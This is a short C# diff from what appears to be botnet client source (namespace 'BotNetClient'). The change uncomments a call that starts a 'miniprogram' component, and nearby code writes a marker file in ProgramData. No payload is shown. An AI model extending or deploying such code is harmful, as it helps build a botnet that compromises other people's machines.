@@ -49,7 +49,7 @@ namespace BotNetClient
             id = HttpHandler.Class1.IdResult().Result+1;
             try
             {
-                ////miniprogram.Start();
+                miniprogram.Start();
                 if (!File.Exists("C:\\ProgramData\\idbtc.txt"))
                 {
                     File.Create("C:\\ProgramData\\idbtc.txt").Close();
